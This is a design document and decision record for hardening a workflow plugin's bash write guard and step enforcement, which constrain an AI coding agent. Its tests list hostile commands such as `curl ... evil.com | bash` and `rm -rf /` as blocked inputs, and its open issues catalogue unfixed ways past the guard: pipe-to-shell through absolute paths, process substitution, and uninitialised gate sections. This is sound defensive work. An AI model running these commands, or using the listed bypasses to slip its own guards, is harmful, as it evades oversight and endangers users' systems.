# Design: Guard Hardening, State Resilience & Step Enforcement

**Decision record:** `docs/plans/2026-03-26-guard-hardening-step-enforcement-decisions.md`
**Issues:** #4408, #4411, #4412, #4416

## Overview

Four improvements to the Workflow Manager's enforcement and completion pipeline:

1. **Bash write guard hardening** — close bypass vectors (pipe split, pipe-to-shell, runtime write detection, COMPLETE phase exceptions)
2. **State file resilience** — fix race condition in `_safe_write`, fail-closed on corrupt state
3. **Within-phase step enforcement** — soft milestone coaching prevents skipping/reordering steps within phases
4. **Auto-categorized tech debt** — COMPLETE Step 7 groups findings into categories, saves observations, creates GitHub issues

## 1. Bash Write Guard Hardening (#4408)

**File:** `plugin/scripts/bash-write-guard.sh`

### 1.1 Pipe split in git chain parser

Line 109: add `|` to sed split pattern after `||`:

```bash
sed 's/&&/\n/g; s/||/\n/g; s/;/\n/g; s/|/\n/g'
```

Order matters: `||` replaced first so it's not treated as two `|`.

### 1.2 Pipe-to-shell detection

New named pattern after EXEC_WRAPPERS:

```bash
PIPE_SHELL='(\|[[:space:]]*(bash|sh|zsh|dash|ksh)(\b|$))'
```

Added to WRITE_PATTERN composition on line 34.

### 1.3 Runtime write detection

Extend the Python write detection block (lines 122-127) to cover Node.js, Ruby, Perl:

```bash
# Node.js
NODE_WRITE=false
if echo "$COMMAND" | grep -qE 'node[[:space:]]+(--eval|-e)[[:space:]]'; then
    if echo "$COMMAND" | grep -qiE 'fs\.|writeFile|appendFile|createWriteStream|child_process|exec\(|spawn\('; then
        NODE_WRITE=true
    fi
fi

# Ruby
RUBY_WRITE=false
if echo "$COMMAND" | grep -qE 'ruby[[:space:]]+-e[[:space:]]'; then
    if echo "$COMMAND" | grep -qiE 'File\.|IO\.|open\(|system\(|exec\(|`'; then
        RUBY_WRITE=true
    fi
fi

# Perl
PERL_WRITE=false
if echo "$COMMAND" | grep -qE 'perl[[:space:]]+-e[[:space:]]'; then
    if echo "$COMMAND" | grep -qiE 'open\(|system\(|unlink|rename'; then
        PERL_WRITE=true
    fi
fi
```

All four runtime flags (`PYTHON_WRITE`, `NODE_WRITE`, `RUBY_WRITE`, `PERL_WRITE`) checked in the write detection conditional (line 138 and line 161).

### 1.4 COMPLETE phase exceptions

Before the write pattern check in the phase-gate section, add COMPLETE-specific allows:

```bash
if [ "$PHASE" = "complete" ]; then
    # gh is an API tool, not a filesystem writer
    if echo "$COMMAND" | grep -qE '^[[:space:]]*(gh)[[:space:]]'; then
        exit 0
    fi
    # Allow rm only for .claude/tmp/ (agent artifacts), with path traversal guard
    if echo "$COMMAND" | grep -qE '^[[:space:]]*rm[[:space:]]' && \
       echo "$COMMAND" | grep -qE '\.claude/tmp/' && \
       ! echo "$COMMAND" | grep -qE '\.\.'; then
        exit 0
    fi
fi
```

### 1.5 Temp directory convention

Agent artifacts (attack-runner output, edge-test results, etc.) write to `.claude/tmp/` instead of `docs/`. This directory is:
- Created on demand by agents
- Cleaned up by COMPLETE Step 7 (after tech debt audit)
- Allowed by the `rm` exception above
- Gitignored (add to `.gitignore` if not already)

Update COMPLETE pipeline agent dispatch prompts to specify `.claude/tmp/` as output directory.

## 2. State File Resilience (#4411)

**File:** `plugin/scripts/workflow-state.sh`

### 2.1 Race condition fix

`_safe_write` line 19: replace PID-based temp filename with `mktemp`:

```bash
_safe_write() {
    local tmpfile
    tmpfile=$(mktemp "${STATE_FILE}.tmp.XXXXXX") || return 1
    cat > "$tmpfile" || { rm -f "$tmpfile"; return 1; }
    # ... rest unchanged
}
```

`mktemp` generates unique filenames regardless of PID sharing in subshells.

### 2.2 Fail-closed on corrupt state

`get_phase`: return `"error"` instead of `"off"` when state is invalid:

```bash
get_phase() {
    if [ ! -f "$STATE_FILE" ]; then
        echo "off"
        return
    fi
    local phase
    phase=$(jq -r '.phase // "off"' "$STATE_FILE" 2>/dev/null) || phase="error"
    [ -z "$phase" ] && phase="error"
    case "$phase" in
        off|define|discuss|implement|review|complete) ;;
        *) phase="error" ;;
    esac
    echo "$phase"
}
```

### 2.3 Error phase propagation

How `"error"` phase is handled by each component:

| Component | Current behavior for unknown phase | New behavior for `"error"` |
|-----------|-----------------------------------|---------------------------|
| bash-write-guard.sh | `*) exit 0` (allow all) | `error` case → use restrictive whitelist, block writes |
| workflow-gate.sh | `*) exit 0` (allow all) | `error` case → block Write/Edit |
| post-tool-navigator.sh | `off` early exit | `error` fires Layer 1 coaching: "State corrupted — run /off to reset" |
| `_phase_ordinal` | `*) echo 0` | `error` maps to 0 (same as off) — auto-transitions still work |
| `set_phase "off"` | Creates fresh state | Unchanged — escape hatch. Writes via `jq -n`, doesn't read old file |

### 2.4 No changes to `_update_state`

When state file has invalid JSON, `jq` fails, `set -o pipefail` catches it, function returns 1. Already fail-closed. No change needed.

## 3. Within-Phase Step Enforcement (#4412)

**Files:** `plugin/scripts/workflow-state.sh`, `plugin/scripts/post-tool-navigator.sh`, `plugin/commands/discuss.md`, `plugin/commands/complete.md`, `plugin/commands/implement.md`, `plugin/commands/review.md`

### 3.1 Step groups and milestones

Phases with step milestones (existing milestones reused where they already exist):

**DISCUSS** (new milestones):
| Group | Milestone | Set by |
|-------|-----------|--------|
| Problem confirmed | `discuss.problem_confirmed` | discuss.md after problem statement validated |
| Research done | `discuss.research_done` | discuss.md after diverge agents return |
| Approach selected | `discuss.approach_selected` | discuss.md after user selects approach |
| Plan written | `discuss.plan_written` | discuss.md after plan review loop passes |

**IMPLEMENT** (existing — no changes):
| Group | Milestone |
|-------|-----------|
| Plan read | `implement.plan_read` |
| Tests passing | `implement.tests_passing` |
| All tasks complete | `implement.all_tasks_complete` |

**REVIEW** (existing — no changes):
| Group | Milestone |
|-------|-----------|
| Agents dispatched | `review.agents_dispatched` |
| Verification complete | `review.verification_complete` |
| Findings presented | `review.findings_presented` |
| Findings acknowledged | `review.findings_acknowledged` |

**COMPLETE** (existing — no changes):
| Group | Milestone |
|-------|-----------|
| Validation | `completion.results_presented` |
| Docs | `completion.docs_checked` |
| Commit/push | `completion.committed` + `completion.pushed` |
| Tech debt | `completion.tech_debt_audited` |
| Handover | `completion.handover_saved` |

### 3.2 New state API for DISCUSS

```bash
reset_discuss_status() {
    _reset_section "discuss" "problem_confirmed" "research_done" "approach_selected" "plan_written"
}
get_discuss_field() { _get_section_field "discuss" "$1"; }
set_discuss_field() { _set_section_field "discuss" "$1" "$2"; }
```

### 3.3 DISCUSS exit gate

```bash
# In _check_phase_gates:
if [ "$current" = "discuss" ] && [ "$new_phase" != "discuss" ]; then
    local missing=""
    missing=$(_check_milestones "discuss" "plan_written")
    if [ -n "$missing" ]; then
        echo "HARD GATE: Cannot leave DISCUSS — plan not written." >&2
        return 1
    fi
fi
```

Only `plan_written` is a hard exit gate. The other DISCUSS milestones are soft (coaching only).

### 3.4 Detection heuristics (Layer 3, Check 9)

New check in `post-tool-navigator.sh` — fires on every match (Layer 3 behavior), in all autonomy modes:

```
Check 9: Within-phase step ordering
```

**COMPLETE phase detections:**

| Tool pattern | Required milestone | Coaching message |
|-------------|-------------------|------------------|
| `git commit` in Bash | `results_presented` | "Committing before validation complete. Run Steps 1-3 first." |
| `git commit` in Bash | `docs_checked` | "Committing before documentation check. Run Step 4 first." |
| `save_observation` (handover) | `tech_debt_audited` | "Writing handover before tech debt audit. Run Step 7 first." |
| `git push` in Bash | `committed` | "Pushing before committing. Run Step 5 first." |

**IMPLEMENT phase detections:**

| Tool pattern | Required milestone | Coaching message |
|-------------|-------------------|------------------|
| Write/Edit to non-test source | `plan_read` | "Writing code before reading the plan. Read the plan first." |

**REVIEW phase detections:**

| Tool pattern | Required milestone | Coaching message |
|-------------|-------------------|------------------|
| Write/Edit to decision record | `agents_dispatched` | "Writing findings before all agents ran. Dispatch agents first." |
| `AskUserQuestion` | `findings_presented` | "Asking for acknowledgment before presenting findings." |

**DISCUSS phase detections:**

Plan file is identified by path matching `docs/superpowers/plans/` or `docs/plans/` (same convention used by existing Layer 2 coaching in post-tool-navigator.sh line 210).

| Tool pattern | Required milestone | Coaching message |
|-------------|-------------------|------------------|
| Write/Edit to `docs/superpowers/plans/` or `docs/plans/` | `approach_selected` | "Writing plan before approach selected. Complete converge phase first." |
| Write/Edit to `docs/superpowers/plans/` or `docs/plans/` | `research_done` | "Writing plan before research complete. Complete diverge phase first." |

Each detection checks the milestone FIRST. If the milestone is already set, no coaching fires. This avoids false positives when steps are done but the detection pattern appears in later work.

### 3.5 Command file milestone calls

**discuss.md** — add at step boundaries:
```bash
.claude/hooks/workflow-cmd.sh set_discuss_field "problem_confirmed" "true"
# ... after diverge agents return:
.claude/hooks/workflow-cmd.sh set_discuss_field "research_done" "true"
# ... after user selects approach:
.claude/hooks/workflow-cmd.sh set_discuss_field "approach_selected" "true"
# ... after plan review passes:
.claude/hooks/workflow-cmd.sh set_discuss_field "plan_written" "true"
```

**complete.md, implement.md, review.md** — milestone calls already exist. No changes needed.

### 3.6 DISCUSS phase initialization

The `discuss.md` command file calls `reset_discuss_status` at phase entry (alongside the existing `set_phase "discuss"` call).

## 4. Auto-Categorized Tech Debt (#4416)

**File:** `plugin/commands/complete.md` (Step 7 enhancement)

### 4.1 Categories

| Category | GitHub Label | Findings from |
|----------|-------------|---------------|
| Security | `security` | Review security agent, devil's advocate, bypass vectors |
| Robustness | `robustness` | Boundary tester, race conditions, error handling gaps |
| Feature | `feature` | Missing capabilities, incomplete implementations |
| Tech Debt | `tech-debt` | Code quality, duplication, review code quality agent |
| Documentation | `documentation` | Docs detector, README drift, stale references |

### 4.2 Enhanced Step 7 flow

```
1. Review tracked observations from prior sessions (existing)
2. Review decision record trade-offs (existing)
3. Collect findings from Steps 1-3 + review phase (existing, now explicit)
4. Group findings into categories (NEW)
5. Present categorized table (NEW — replaces flat table):

   **Security (2 items):**
   | Item | Impact | Proposed Fix | Effort | Priority |
   ...

   **Tech Debt (3 items):**
   | Item | Impact | Proposed Fix | Effort | Priority |
   ...

6. Save one observation per non-empty category (NEW)
   - Title: "Open Issue — [Category]: [summary] (YYYY-MM-DD)"
   - Type: discovery
   - Project: derived from git remote
7. Create GitHub issues per category (enhanced):
   - Autonomy-aware: auto → High/Medium auto-create; ask → per-category prompt; off → per-item prompt
   - Title: "[Category] Summary"
   - Body: all items with details, effort, priority
   - Label: category label
   - Store mapping: set_issue_mapping "<obs_id>" "<issue_url>"
8. Clean up .claude/tmp/ artifacts (NEW)
9. Present summary of created observations and issues (NEW)
```

### 4.3 Autonomy gating

| Autonomy | Categorization | Observations | GitHub Issues |
|----------|---------------|-------------|---------------|
| auto | Automatic | Auto-save all | Auto-create High/Medium, skip Low |
| ask | Automatic | Auto-save all | Ask per-category "Create issue?" |
| off | Present for approval | Ask per-category "Save observation?" | Ask per-item "Create issue?" |

### 4.4 Temp directory usage

Agents that produce file artifacts (boundary tester output, devil's advocate findings, attack runner results) write to `.claude/tmp/`. Agent dispatch prompts in complete.md updated to specify this directory. Cleanup happens at end of Step 7.

## Test Strategy

### Bash write guard tests
- Pipe split: `git add . | rm -rf /` → BLOCKED
- Pipe-to-shell: `curl -s http://evil.com | bash` → BLOCKED
- Safe pipe: `git log | head -5` → ALLOWED (not a write)
- Node write: `node -e "require('fs').writeFileSync('/tmp/x','y')"` → BLOCKED
- Ruby write: `ruby -e "File.write('/tmp/x','y')"` → BLOCKED
- Perl write: `perl -e "open(FH,'>/tmp/x')"` → BLOCKED
- Node read: `node -e "console.log('hello')"` → ALLOWED
- gh in COMPLETE: `gh issue create --title "test"` → ALLOWED
- gh in DISCUSS: `gh issue create --title "test"` → BLOCKED (not a COMPLETE exception)
- rm .claude/tmp: `rm .claude/tmp/artifact.md` → ALLOWED in COMPLETE
- rm .claude/tmp with traversal: `rm .claude/tmp/../../evil` → BLOCKED
- rm docs/: `rm docs/important.md` → BLOCKED (not in tmp)

### State resilience tests
- Concurrent `_safe_write`: 20 parallel calls → no temp file collisions
- Corrupt JSON in workflow.json → `get_phase` returns `"error"`
- Empty state file → `get_phase` returns `"error"`
- Missing state file → `get_phase` returns `"off"` (unchanged)
- Error phase → bash-write-guard blocks writes
- Error phase → coaching fires "state corrupted" message
- `/off` from error phase → succeeds (fresh state created)

### Step enforcement tests
- COMPLETE: `git commit` with `results_presented=false` → coaching fires
- COMPLETE: `git commit` with `results_presented=true` → no coaching
- COMPLETE: `save_observation` with `tech_debt_audited=false` → coaching fires
- DISCUSS: Write to plan file with `approach_selected=false` → coaching fires
- DISCUSS: Write to plan file with `approach_selected=true` → no coaching
- DISCUSS exit with `plan_written=false` → hard gate blocks
- IMPLEMENT: Edit source with `plan_read=false` → coaching fires

### Categorization tests
- Findings grouped into correct categories
- Empty categories skipped (no observation or issue created)
- Observation titles follow convention
- GitHub issue labels match category
- Issue mapping stored after creation
- Autonomy gating: auto creates High/Medium, skips Low


## Decision Record (Archived)

# Decision Record: Guard Hardening, State Resilience & Step Enforcement

## Problem

Four open issues from the v1.9.0 session need resolution:

1. **#4408 — Bash write guard bypass vectors (Medium/Security):** The write guard has gaps — pipe `|` not split in git chain parser, `curl|bash` undetected, `node -e`/`ruby -e`/`perl -e` file writes undetected. These are defense-in-depth gaps in a "speed bump, not a wall" guard.

2. **#4411 — State file resilience (Medium/Robustness):** Race condition in `_safe_write` uses `$$` which collides in subshells. Corrupt state file returns `"off"` phase, silently disabling all enforcement (fail-open).

3. **#4412 — Within-phase step enforcement (High/Feature):** Nothing prevents Claude from skipping or reordering steps within a phase. Caused user frustration twice in v1.9.0 when COMPLETE Steps 7-8 were skipped.

4. **#4416 — Auto-categorized tech debt to GitHub issues (High/Feature):** COMPLETE pipeline Step 7 produces flat findings. Need auto-categorization into groups, one claude-mem observation per category, and one GitHub issue per category with statusline linking.

### Measurable Outcomes

1. Bash write guard blocks `echo test | bash`, `curl URL | sh`, `node -e "require('fs').writeFileSync(...)"` in define/discuss/complete phases
2. Pipe `|` in git chain detection splits correctly — `git add . | rm -rf /` is blocked
3. Corrupt `workflow.json` returns `"error"` phase (not `"off"`), blocking writes until user resets
4. `_safe_write` race condition eliminated — concurrent calls don't collide on temp filenames
5. COMPLETE phase coaching fires when Claude attempts `git commit` before `results_presented` milestone
6. DISCUSS phase has milestones (`problem_confirmed`, `research_done`, `approach_selected`, `plan_written`)
7. Step 7 groups findings into categories (Security, Robustness, Feature, Tech Debt, Documentation)
8. One claude-mem observation saved per non-empty category
9. One GitHub issue created per category (autonomy-aware gating)
10. `gh` commands allowed in COMPLETE phase; `rm` allowed only for `.claude/tmp/`

## Approaches Considered (DISCUSS phase — diverge)

### Approach A: Coaching-Only Step Enforcement
- Step counter integer per phase, coaching fires if counter is behind
- **Pros:** Minimal state changes (~5 lines). No gates.
- **Cons:** No persistence. Claude can ignore coaching AND skip the counter increment. Weakest enforcement.

### Approach B: Soft Milestone Step Enforcement (Selected)
- Per-phase step milestones reusing existing exit gate infrastructure. Coaching fires when later-step tool patterns detected before earlier milestone is set.
- **Pros:** Persistent state. Reuses existing `_reset_section`/`_check_milestones` API. Consistent with exit gates. Self-correcting (coaching tells Claude which milestone to mark).
- **Cons:** More state (~4 new DISCUSS milestones). Detection heuristics are approximate. Possible false positives.

### Approach C: Hard Gate Step Enforcement
- Same as B but tool calls blocked if prior milestone not set.
- **Pros:** Strongest guarantee.
- **Cons:** Too rigid for parallel steps. Risk of locking users out. Contradicts "speed bump" philosophy.

## Decision (DISCUSS phase — converge)

- **Chosen approach:** Approach B — Soft Milestone Step Enforcement
- **Rationale:** Extends existing infrastructure, provides persistent tracking, coaching matches project philosophy. The v1.9.0 problem was absence of enforcement, not Claude deliberately bypassing it — coaching would have caught it.
- **Trade-offs accepted:**
  - Detection heuristics may produce false positives (cost: annoying coaching message, self-corrects)
  - Claude can theoretically ignore coaching (cost: same as v1.9.0, but now visible)
  - More state fields to manage (cost: maintenance overhead, mitigated by reusing existing API)
  - `rm .claude/tmp/` exception is coarse (cost: could delete all temp files, acceptable since it's a temp dir)
  - Category grouping means mixed effort/priority per GitHub issue (cost: less granular tracking)
- **Risks identified:**
  - False positive coaching could train Claude to ignore coaching messages (mitigation: keep messages specific and actionable)
  - Corrupt state fail-closed could surprise users (mitigation: immediate coaching message with reset instructions)
- **Constraints applied:**
  - Must fire in all autonomy modes (user decision)
  - Categorization in complete.md, not a separate agent (token efficiency)
  - Bypass fixes limited to Option B scope (pipe-to-shell + runtime detection, not xargs/chmod)
- **Tech debt acknowledged:**
  - Low-severity bypass vectors (`xargs rm`, `chmod`/`mkdir`) left open
  - DEFINE phase has no step milestones (simplest phase, not worth the overhead)
  - No hard gates on within-phase steps (deliberate — could be added later if coaching proves insufficient)

## Review Findings (REVIEW phase)

### Critical
- [SEC] `gh issue list | bash` bypasses all guards in COMPLETE — gh exception exits early before PIPE_SHELL check. Fix: add `! echo "$COMMAND" | grep -qE "$PIPE_SHELL"` to gh exception guard. `bash-write-guard.sh:189-192`.
- [ARCH] Hard gate bypass when `reset_*_status()` never called — `_check_milestones` returns empty (no missing) when section doesn't exist, so gate always passes. Affects DISCUSS, IMPLEMENT, COMPLETE gates. Fix: `_check_milestones` should fail-closed when section absent. `workflow-state.sh:645`.

### Warnings (fixed)
- [QUAL] `gh` chain guard blocked legitimate pipes (`gh issue list | jq`). Fixed: removed `|` from gh chain guard, kept `&&`/`||`/`;`.
- [QUAL] Pipe split over-splits safe git chains. Accepted: fails closed (denies rather than allows), low priority.
- [ARCH] Plan references `plugin/version.txt` which doesn't exist. Accepted: plan template error, version bumped correctly in both JSON files.

### Suggestions (accepted as tech debt)
- [QUAL] DRY opportunity: 4 runtime write detection blocks share identical structure. Could extract helper function.
- [QUAL] Extract `is_write_tool()` helper in post-tool-navigator for repeated Write/Edit/MultiEdit checks.
- [HYG] Test file is 2750+ lines — consider splitting into per-component test files.
- [HYG] Legacy numeric autonomy mapping (1/2/3 → off/ask/auto) is dead code but harmless.
- [GOV] Docs don't carry license headers (matches existing convention).
- [ARCH] Negative test assertions use non-exact message fragments (fragile but passing).

## Outcome Verification (COMPLETE phase)
- [x] Outcome 1: Bash guard blocks `echo test | bash`, `curl | sh`, `node -e writeFileSync` — PASS — 10 tests in run-tests.sh:1237-1284
- [x] Outcome 2: Pipe `|` in git chain splits correctly — PASS — test at run-tests.sh:1228
- [x] Outcome 3: Corrupt state returns `"error"` phase — PASS — 3 tests (corrupt JSON, empty, unknown phase)
- [x] Outcome 4: `_safe_write` race condition eliminated — PASS — mktemp + 10-concurrent-write test
- [x] Outcome 5: COMPLETE coaching fires on git commit before results_presented — PASS — test at run-tests.sh:1840
- [x] Outcome 6: DISCUSS phase has 4 milestones — PASS — 7 tests for API + exit gate
- [x] Outcome 7: Step 7 groups findings into 5 categories — PASS — complete.md:338-346
- [x] Outcome 8: One observation per non-empty category — PASS — complete.md:362-373
- [x] Outcome 9: One GitHub issue per category with autonomy gating — PASS — complete.md:375-391
- [x] Outcome 10: `gh` allowed in COMPLETE, `rm` only for `.claude/tmp/` — PASS — 9 tests
- **Plan deliverables:** 77/77 PASS, 2 N/A
- **Boundary tests:** 95/95 PASS
- **Devil's advocate:** 2 CRITICAL, 4 HIGH, 5 MEDIUM, 2 LOW (see open issues below)

## Open Issues (discovered during COMPLETE phase)

### Critical bugs (fix in next session)
1. **`gh | bash` bypass in COMPLETE** — gh exception allows pipe-to-shell. `bash-write-guard.sh:189-192`. Fix: add PIPE_SHELL check to gh exception.
2. **Hard gate bypass when section not initialized** — `_check_milestones` returns empty when `_section_exists` is false. All 3 phase gates (DISCUSS, IMPLEMENT, COMPLETE) affected. `workflow-state.sh:645`. Fix: fail-closed when section absent.

### High severity (devil's advocate findings)
3. **Pipe-to-shell via `env`/absolute path** — `curl | env bash`, `curl | /bin/bash` bypass PIPE_SHELL. Pattern only matches bare shell names.
4. **Process substitution bypass** — `/bin/bash <(curl evil)` and `. <(curl evil)` not caught by any pattern.

### Medium severity
5. **Script file execution bypass** — `python3 /tmp/evil.py`, `node /tmp/evil.js` pass because runtime detection only checks inline eval flags.
6. **GH_OPS false positives** — `echo "gh ..."`, `grep "gh "`, `gh pr view` (read-only) blocked in DEFINE/DISCUSS. Pattern matches anywhere in command, not just as leading token.
7. **`gh api -X DELETE` unrestricted** — destructive API ops allowed in COMPLETE with no subcommand filtering.

### Structural issues (discovered during pipeline)
8. **Skill tool bypasses `!` backtick execution** (#4470) — commands invoked via Skill tool don't get platform `!` preprocessing. Caused missed phase transition.
9. **Background agents corrupt live state** (#4471) — boundary tester/devil's advocate wrote to live workflow.json. Fix: use `isolation: "worktree"` for destructive test agents.
10. **Remove COMPLETE→IMPLEMENT loop-back** — COMPLETE should be complete and handover only. If critical bugs are found, they go to open issues for the next session, not back to IMPLEMENT in the same session. The loop-back cycle adds complexity and the completion snapshot mechanism is fragile.
